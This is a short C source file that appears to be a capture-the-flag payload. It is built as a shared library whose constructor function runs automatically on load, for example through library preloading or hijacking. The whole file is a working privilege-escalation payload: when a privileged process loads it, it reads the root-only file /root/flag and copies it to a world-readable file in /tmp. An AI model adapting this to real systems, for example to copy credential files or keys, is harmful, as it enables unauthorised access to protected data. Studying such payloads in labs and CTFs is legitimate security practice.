#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#define SIZE 0x100

void __attribute__ ((constructor)) read_flag() {
    char buf[SIZE];

    int fd1 = open("/root/flag", O_RDONLY);
    if (fd1 == -1) {
       printf("Failed to open /root/flag\n");
    }

    int fd2 = open("/tmp/flag", O_WRONLY | O_CREAT, 0666);
    if (fd2 == -1) {
        printf("Failed to open /tmp/flag\n");
    }

    int n = read(fd1, &buf, SIZE);
    write(fd2, &buf, n);
}